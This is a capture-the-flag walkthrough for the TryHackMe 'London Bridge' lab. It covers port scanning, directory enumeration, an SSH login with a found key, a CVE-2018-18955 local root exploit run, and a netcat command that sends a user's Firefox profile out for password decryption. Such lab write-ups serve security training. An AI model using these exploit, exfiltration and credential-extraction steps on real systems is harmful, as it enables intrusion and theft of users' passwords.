Hi, here is how to successfully complete the machine https://tryhackme.com/r/room/thelondonbridge

I start by checking if the machine is available by doing a ping -c 1
<pre><code>> ping -c 1 10.10.3.253
PING 10.10.3.253 (10.10.3.253) 56(84) bytes of data.
64 bytes from 10.10.3.253: icmp_seq=1 ttl=63 time=244 ms

--- 10.10.3.253 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 243.675/243.675/243.675/0.000 ms</code></pre>

after verifying that the machine is available I start by doing a quick scan of the ports.
<pre><code>> sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.3.253 | tee nmap1.txt
[sudo] contraseña para maxi: 
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-03 11:25 -03
Initiating SYN Stealth Scan at 11:25
Scanning 10.10.3.253 [65535 ports]
Discovered open port 22/tcp on 10.10.3.253
Discovered open port 8080/tcp on 10.10.3.253
Completed SYN Stealth Scan at 11:26, 26.58s elapsed (65535 total ports)
Nmap scan report for 10.10.3.253
Host is up, received user-set (0.69s latency).
Scanned at 2024-10-03 11:25:42 -03 for 26s
Not shown: 54951 filtered tcp ports (no-response), 10582 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.72 seconds
           Raw packets sent: 127155 (5.595MB) | Rcvd: 10641 (425.656KB)</code></pre>

Once I identify which ports are available, I perform a more detailed scan on those ports
<pre><code>> sudo nmap -p22,8080 -sCV -Pn 10.10.3.253 | tee nmap2.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-03 11:26 -03
Nmap scan report for 10.10.3.253
Host is up (0.39s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 58:c1:e4:79:ca:70:bc:3b:8d:b8:22:17:2f:62:1a:34 (RSA)
|   256 2a:b4:1f:2c:72:35:7a:c3:7a:5c:7d:47:d6:d0:73:c8 (ECDSA)
|_  256 1c:7e:d2:c9:dd:c2:e4:ac:11:7e:45:6a:2f:44:af:0f (ED25519)
8080/tcp open  http    Gunicorn
|_http-server-header: gunicorn
|_http-title: Explore London
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.46 seconds</code></pre>


![2024-10-03_11-28](https://github.com/user-attachments/assets/1e5abef6-fd72-46c9-af2a-cb5c5d6b4e82)

<pre><code>> gobuster dir -u http://10.10.3.253:8080/ -w /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 | tee gobuster.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.3.253:8080/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /home/maxi/Escritorio/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/contact              (Status: 200) [Size: 1703]
/feedback             (Status: 405) [Size: 178]
/gallery              (Status: 200) [Size: 1722]
/upload               (Status: 405) [Size: 178]
/dejaview             (Status: 200) [Size: 823]</code></pre>

![2024-10-03_12-05](https://github.com/user-attachments/assets/4e0164e9-c7cf-477f-a135-f65246ab4032)


![2024-10-03_13-43](https://github.com/user-attachments/assets/0d3f160f-abb8-41ba-8095-dd27620b40d7)

![2024-10-03_13-45](https://github.com/user-attachments/assets/8e032f11-a555-4c33-8e08-0af46e4fcb38)


<pre><code>> chmod 600 id_rsa
> ssh -i id_rsa beth@10.10.3.253
^C⏎                                                                                                                 maxi@maxi-notebook ~/C/T/t/content [SIGINT]> ssh -i id_rsa beth@10.10.52.222
The authenticity of host '10.10.52.222 (10.10.52.222)' can't be established.
ED25519 key fingerprint is SHA256:ytPniu9JUHpepgFs9WjrDo4KrlD74N5VR4L5MCCx3D8.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.52.222' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-112-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch
Last login: Mon May 13 22:38:30 2024 from 192.168.62.137
beth@london:~$ 
</code></pre>

<pre><code>beth@london:/home$ find / -type f -name 'user.txt' 2>/dev/null                                                      
/home/beth/__pycache__/user.txt</code></pre>

<pre><code>beth@london:~/__pycache__$ uname -a
Linux london 4.15.0-112-generic #113-Ubuntu SMP Thu Jul 9 23:41:39 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux</code></pre>

https://github.com/scheatkode/CVE-2018-18955
exploit.dbus.sh
php-reverse-shell.php
rootshell.c
subshell.c
subuid_shell.c
<pre><code>beth@london:~$ bash exploit.dbus.sh 
[*] Compiling...
[*] Creating /usr/share/dbus-1/system-services/org.subuid.Service.service...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 100000
[.] subgid: 100000
[~] done, mapped subordinate ids
[.] executing subshell
[*] Creating /etc/dbus-1/system.d/org.subuid.Service.conf...
[.] starting
[.] setting up namespace
[~] done, namespace sandbox set up
[.] mapping subordinate ids
[.] subuid: 100000
[.] subgid: 100000
[~] done, mapped subordinate ids
[.] executing subshell
[*] Launching dbus service...
Error org.freedesktop.DBus.Error.NoReply: Did not receive a reply. Possible causes include: the remote application did not send a reply, the message bus security policy blocked the reply, the reply timeout expired, or the network connection was broken.
[+] Success:
-rwsrwxr-x 1 root root 8392 Oct  3 10:08 /tmp/sh
[*] Cleaning up...
[*] Launching root shell: /tmp/sh
root@london:~# </code></pre>

<pre><code>root@london:/root# ls -la
total 52
drwx------  6 root root 4096 Apr 23 22:10 .
drwxr-xr-x 23 root root 4096 Apr  7 01:10 ..
lrwxrwxrwx  1 root root    9 Sep 18  2023 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  3 root root 4096 Apr 23 22:08 .cache
-rw-r--r--  1 beth beth 2246 Mar 16  2024 flag.py
-rw-r--r--  1 beth beth 2481 Mar 16  2024 flag.pyc
drwx------  3 root root 4096 Apr 23 22:08 .gnupg
drwxr-xr-x  3 root root 4096 Sep 16  2023 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwxr-xr-x  2 root root 4096 Mar 16  2024 __pycache__
-rw-rw-r--  1 root root   27 Sep 18  2023 .root.txt
-rw-r--r--  1 root root   66 Mar 10  2024 .selected_editor
-rw-r--r--  1 beth beth  175 Mar 16  2024 test.py
root@london:/root# cat .root.txt
THM{???}</code></pre>

<pre><code>root@london:/home/charles/.mozilla# tar -cvzf /tmp/firefox.tar.gz firefox </code></pre>


<pre><code>nc {ip} 1234 < /tmp/firefox.tar.gz</code></pre>

<pre><code>~> tar -xvzf firefox.tar.gz</code></pre>

<pre><code>sudo chmod -R 777 firefox</code></pre>

<pre><code>python3 firefox_decrypt.py firefox/8k3bf3zp.charles/
2024-10-03 16:27:03,316 - WARNING - profile.ini not found in firefox/8k3bf3zp.charles/
2024-10-03 16:27:03,318 - WARNING - Continuing and assuming 'firefox/8k3bf3zp.charles/' is a profile location

Website:   https://www.buckinghampalace.com
Username: 'Charles'
Password: '?????'</code></pre>
